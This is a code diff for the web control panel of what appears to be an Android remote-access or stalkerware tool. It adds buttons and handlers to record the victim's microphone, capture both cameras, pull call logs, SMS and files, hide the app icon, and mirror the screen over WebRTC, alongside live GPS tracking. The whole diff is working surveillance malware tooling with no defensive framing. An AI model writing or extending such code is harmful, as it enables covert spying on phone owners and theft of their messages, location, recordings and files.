@@ -17,11 +17,12 @@
 
         /* ===== SIDEBAR ===== */
         #sidebar{
-            width:270px;
+            width:300px;
             background:linear-gradient(180deg,#020202,#000);
             border-right:1px solid #00f7ff22;
             padding:20px;
             box-shadow:0 0 30px #00f7ff11;
+            overflow-y:auto;
         }
 
         .logo{
@@ -59,6 +60,13 @@
             background:#00f7ff;
             color:#000;
             box-shadow:0 0 12px #00f7ff;
+        }
+
+        button.small{
+            width:auto;
+            float:right;
+            margin:0 0 0 5px;
+            padding:4px 8px;
         }
 
         /* ===== MAIN ===== */
@@ -104,9 +112,10 @@
             display:flex;
             align-items:center;
             justify-content:center;
+            min-height:300px;
         }
 
-        video{
+        video, img{
             width:100%;
             height:100%;
             object-fit:contain;
@@ -130,12 +139,27 @@
             padding:8px;
             margin-bottom:8px;
             font-size:12px;
+            word-break:break-word;
+        }
+
+        .card button{
+            width:auto;
+            float:right;
+            margin-left:5px;
+            padding:2px 6px;
         }
 
         /* MAP */
         #map{
             height:300px;
             border-radius:8px;
+            margin-bottom:15px;
+        }
+
+        /* AUDIO PLAYER */
+        audio{
+            width:100%;
+            margin-top:10px;
         }
     </style>
 </head>
@@ -147,13 +171,24 @@
     <div class="section">
         <div class="section-title">SURVEILLANCE</div>
         <button onclick="startScreen()">🖥 SCREEN MIRROR</button>
+        <button onclick="stopScreen()">⏹ STOP SCREEN</button>
         <button onclick="send('camFront')">📹 FRONT CAMERA</button>
+        <button onclick="send('camBack')">📹 BACK CAMERA</button>
         <button onclick="send('getLocation')">📍 LIVE GPS</button>
+        <button onclick="send('startAudio')">🎤 START MIC</button>
+        <button onclick="send('stopAudio')">⏹ STOP MIC</button>
     </div>
     <div class="section">
         <div class="section-title">DATA</div>
         <button onclick="send('ls root')">📂 FILE MANAGER</button>
         <button onclick="send('getSMS inbox')">💬 SMS LOGS</button>
+        <button onclick="send('getCallLogs')">📞 CALL LOGS</button>
+    </div>
+    <div class="section">
+        <div class="section-title">CONTROL</div>
+        <button onclick="send('hideApp')">👻 HIDE APP ICON</button>
+        <button onclick="send('showApp')">👀 SHOW APP ICON</button>
+        <button onclick="send('vibrate 1000')">📳 VIBRATE (1s)</button>
     </div>
 </div>
 
@@ -165,11 +200,13 @@
     </div>
     <div id="content">
         <div id="video-panel">
-            <video id="remoteVideo" autoplay playsinline></video>
+            <video id="remoteVideo" autoplay playsinline style="display:none;"></video>
+            <div id="placeholder">No video feed</div>
         </div>
         <div id="data-panel">
             <div id="map"></div>
             <div id="data"></div>
+            <div id="audio-container"></div>
         </div>
     </div>
 </div>
@@ -182,7 +219,8 @@
     // ---------- GLOBAL STATE ----------
     let ws;
     let mapInstance = null;
-    let pc = null;  // WebRTC peer connection (for screen mirror)
+    let pc = null;                     // WebRTC peer connection
+    let currentVideoStream = null;      // For screen mirror
 
     // ---------- CONNECTION ----------
     function connectWebSocket() {
@@ -217,53 +255,70 @@
                     console.error('Invalid file list', e);
                 }
             }
+            else if (msg.startsWith("FILE_DATA:")) {
+                // For simplicity, offer download
+                const base64 = msg.substring(10);
+                downloadBase64File(base64, "downloaded_file");
+            }
             else if (msg.startsWith("SMS_DATA:")) {
                 try {
                     const smsData = JSON.parse(msg.substring(9));
-                    renderLogs(smsData);
+                    renderLogs(smsData, "SMS Logs");
                 } catch (e) {
                     console.error('Invalid SMS data', e);
+                }
+            }
+            else if (msg.startsWith("CALL_DATA:")) {
+                try {
+                    const callData = JSON.parse(msg.substring(10));
+                    renderLogs(callData, "Call Logs");
+                } catch (e) {
+                    console.error('Invalid call logs', e);
                 }
             }
             else if (msg.startsWith("CAMERA_IMAGE:")) {
                 const base64 = msg.substring(13);
                 displayImage(base64);
             }
-            else if (msg.startsWith("CALL_DATA:")) {
-                try {
-                    const callData = JSON.parse(msg.substring(10));
-                    renderLogs(callData);
-                } catch (e) {
-                    console.error('Invalid call logs', e);
-                }
+            else if (msg.startsWith("AUDIO_RECORDING:")) {
+                const base64 = msg.substring(16);
+                playAudio(base64);
             }
-            else if (msg.startsWith("RTC_OFFER:")) {
-                // For screen mirroring – handle WebRTC offer
-                const offerStr = msg.substring(11); // "screen:{"sdp":...}"
-                // In a real implementation, you'd parse and set remote description
-                console.log('Received RTC offer', offerStr);
+            else if (msg.startsWith("AUDIO_STARTED")) {
+                showNotification("Audio recording started");
             }
-            else if (msg.startsWith("RTC_ANSWER:")) {
-                const answerStr = msg.substring(11);
-                console.log('Received RTC answer', answerStr);
-                if (pc) {
-                    try {
-                        pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(answerStr)));
-                    } catch (e) {
-                        console.error('Failed to set remote description', e);
-                    }
-                }
+            else if (msg.startsWith("AUDIO_STOPPED")) {
+                showNotification("Audio recording stopped");
+            }
+            else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
+                showNotification("Screen sharing started");
+            }
+            else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
+                stopScreenShare();
+                showNotification("Screen sharing stopped");
+            }
+            else if (msg.startsWith("RTC_OFFER:screen:")) {
+                const sdp = msg.substring(17); // after "RTC_OFFER:screen:"
+                handleOffer(sdp);
             }
             else if (msg.startsWith("ICE_CANDIDATE:")) {
                 const candidateStr = msg.substring(14);
-                console.log('Received ICE candidate', candidateStr);
-                if (pc) {
-                    try {
-                        pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
-                    } catch (e) {
-                        console.error('Failed to add ICE candidate', e);
-                    }
-                }
+                handleIceCandidate(candidateStr);
+            }
+            else if (msg.startsWith("ERROR:")) {
+                alert("Error: " + msg.substring(6));
+            }
+            else if (msg.startsWith("APP_HIDDEN")) {
+                showNotification("App icon hidden");
+            }
+            else if (msg.startsWith("APP_SHOWN")) {
+                showNotification("App icon shown");
+            }
+            else if (msg.startsWith("VIBRATE_DONE")) {
+                showNotification("Vibration completed");
+            }
+            else {
+                console.log('Unhandled message:', msg);
             }
         };
 
@@ -300,15 +355,16 @@
         if (mapInstance) mapInstance.remove();
         mapInstance = L.map('map').setView([data.lat, data.lon], 18);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([data.lat, data.lon], { radius: data.acc || data.accuracy }).addTo(mapInstance);
+        L.circle([data.lat, data.lon], { radius: data.acc || data.accuracy, color: '#00f7ff' }).addTo(mapInstance);
     }
 
     // ---------- FILE BROWSER ----------
     function renderFiles(files) {
-        const html = files.map(f => `
+        let html = '<h3>File Manager</h3>';
+        html += files.map(f => `
             <div class="card">
                 ${f.isDir ? '📁' : '📄'} ${f.name} (${formatBytes(f.size)})
-                <button style="width:auto;float:right" onclick="send('${f.isDir ? 'ls ' + f.path : 'dl ' + f.path}')">
+                <button class="small" onclick="send('${f.isDir ? 'ls ' + f.path : 'dl ' + f.path}')">
                     ${f.isDir ? 'OPEN' : 'DL'}
                 </button>
             </div>
@@ -324,18 +380,44 @@
         return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
     }
 
-    // ---------- SMS / LOGS ----------
-    function renderLogs(data) {
-        const html = data.map(item => 
+    // ---------- LOGS (SMS/Call) ----------
+    function renderLogs(data, title) {
+        let html = `<h3>${title}</h3>`;
+        html += data.map(item => 
             `<div class="card">${JSON.stringify(item, null, 2)}</div>`
         ).join('');
         document.getElementById('data').innerHTML = html;
     }
 
-    // ---------- CAMERA IMAGE DISPLAY ----------
+    // ---------- CAMERA IMAGE ----------
     function displayImage(base64Image) {
         const videoPanel = document.getElementById('video-panel');
         videoPanel.innerHTML = `<img src="data:image/jpeg;base64,${base64Image}" style="max-width:100%; max-height:100%;">`;
+    }
+
+    // ---------- AUDIO PLAYBACK ----------
+    function playAudio(base64Audio) {
+        const audioContainer = document.getElementById('audio-container');
+        audioContainer.innerHTML = `
+            <audio controls src="data:audio/3gp;base64,${base64Audio}"></audio>
+            <button onclick="downloadBase64File('${base64Audio}', 'recording.3gp')">Download Audio</button>
+        `;
+    }
+
+    // ---------- DOWNLOAD BASE64 FILE ----------
+    function downloadBase64File(base64, filename) {
+        const link = document.createElement('a');
+        link.href = 'data:application/octet-stream;base64,' + base64;
+        link.download = filename;
+        link.click();
+    }
+
+    // ---------- NOTIFICATION (temporary) ----------
+    function showNotification(text) {
+        const status = document.getElementById('status');
+        const original = status.innerText;
+        status.innerText = text;
+        setTimeout(() => { status.innerText = original; }, 2000);
     }
 
     // ---------- WEBRTC SCREEN SHARING ----------
@@ -344,33 +426,77 @@
             alert('Not connected');
             return;
         }
-
-        // Reset video panel
+        // Send command to device to start screen sharing
+        send('START_SCREEN_SHARE');
+        // Prepare video panel
         document.getElementById('video-panel').innerHTML = '<video id="remoteVideo" autoplay playsinline></video>';
-        const videoElement = document.getElementById('remoteVideo');
+        showNotification("Waiting for screen stream...");
+    }
 
-        // Create peer connection
-        pc = new RTCPeerConnection({
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+    function stopScreen() {
+        send('STOP_SCREEN_SHARE');
+        stopScreenShare();
+    }
+
+    function stopScreenShare() {
+        if (pc) {
+            pc.close();
+            pc = null;
+        }
+        document.getElementById('video-panel').innerHTML = '<div id="placeholder">Screen sharing stopped</div>';
+    }
+
+    // WebRTC signaling handlers
+    function handleOffer(sdp) {
+        console.log('Received offer', sdp);
+        // Create peer connection if not exists
+        if (!pc) {
+            pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            });
+
+            pc.ontrack = (event) => {
+                console.log('Track received');
+                const video = document.getElementById('remoteVideo');
+                if (video && event.streams && event.streams[0]) {
+                    video.srcObject = event.streams[0];
+                    video.style.display = 'block';
+                }
+            };
+
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    ws.send('ICE_CANDIDATE:' + JSON.stringify(event.candidate));
+                }
+            };
+
+            pc.oniceconnectionstatechange = () => {
+                console.log('ICE state:', pc.iceConnectionState);
+            };
+        }
+
+        // Set remote description
+        const offer = new RTCSessionDescription({
+            type: 'offer',
+            sdp: sdp
         });
+        pc.setRemoteDescription(offer).then(() => {
+            return pc.createAnswer();
+        }).then((answer) => {
+            return pc.setLocalDescription(answer);
+        }).then(() => {
+            ws.send('ANSWER:' + pc.localDescription.sdp);
+        }).catch(e => console.error('Error handling offer:', e));
+    }
 
-        pc.ontrack = (event) => {
-            console.log('Track received');
-            if (event.streams && event.streams[0]) {
-                videoElement.srcObject = event.streams[0];
-            }
-        };
-
-        pc.onicecandidate = (event) => {
-            if (event.candidate) {
-                ws.send('ICE_CANDIDATE:' + JSON.stringify(event.candidate));
-            }
-        };
-
-        // Create and send offer
-        const offer = await pc.createOffer();
-        await pc.setLocalDescription(offer);
-        ws.send('RTC_OFFER:screen:' + JSON.stringify(offer));
+    function handleIceCandidate(candidateStr) {
+        if (!pc) return;
+        try {
+            const candidate = new RTCIceCandidate(JSON.parse(candidateStr));
+            pc.addIceCandidate(candidate).catch(e => console.error('Error adding ICE candidate:', e));
+        } catch (e) {
+            console.error('Invalid ICE candidate', e);
+        }
     }
 
     // ---------- INIT ----------
